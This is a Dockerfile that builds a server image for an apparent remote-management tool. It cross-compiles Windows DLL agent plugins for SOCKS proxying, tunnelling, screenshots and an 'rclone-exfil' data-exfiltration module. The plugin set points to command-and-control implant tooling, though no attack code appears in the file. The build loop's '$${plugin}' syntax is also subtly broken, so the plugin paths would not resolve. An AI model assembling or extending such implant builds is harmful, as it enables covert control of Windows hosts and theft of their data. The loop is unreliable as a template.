# Central control plane and the optional workspace sidecar share one image.
# The control plane has no network namespace privileges; only a workspace
# container that owns a local TUN device needs NET_ADMIN and /dev/net/tun.

FROM golang:1.27-bookworm AS artifact-builder

RUN apt-get update \
    && apt-get install -y --no-install-recommends gcc-mingw-w64-x86-64 \
    && rm -rf /var/lib/apt/lists/*

WORKDIR /src
COPY server-tun ./server-tun
COPY agent-plugins ./agent-plugins

RUN mkdir -p /out/plugins /out/tools \
    && cd server-tun \
    && go build -trimpath -ldflags "-s -w" -o /out/tools/rmm-tun . \
    && for plugin in socks tun screenshot rclone-exfil; do \
         cd /src/agent-plugins/$${plugin}; \
         CGO_ENABLED=1 GOOS=windows GOARCH=amd64 \
           CC=x86_64-w64-mingw32-gcc \
           go build -trimpath -ldflags "-s -w" -buildmode=c-shared \
           -o /out/plugins/$${plugin}.dll .; \
       done

FROM python:3.12-slim AS runtime

ENV PYTHONDONTWRITEBYTECODE=1 \
    PYTHONUNBUFFERED=1 \
    RMM_STORAGE_MODE=workspace \
    RMM_PLUGINS_DIR=/app/plugins \
    RMM_WORKSPACE_TUN_HELPER=/app/tools/rmm-tun

WORKDIR /app
COPY requirements.txt requirements-mcp.txt ./
RUN pip install --no-cache-dir -r requirements.txt
COPY . .
COPY --from=artifact-builder /out/tools/rmm-tun /app/tools/rmm-tun
COPY --from=artifact-builder /out/plugins /app/plugins
RUN chmod 0755 /app/tools/rmm-tun

EXPOSE 8080 8787

CMD ["python3", "server_rmm.py", "8080", "--bind", "0.0.0.0"]
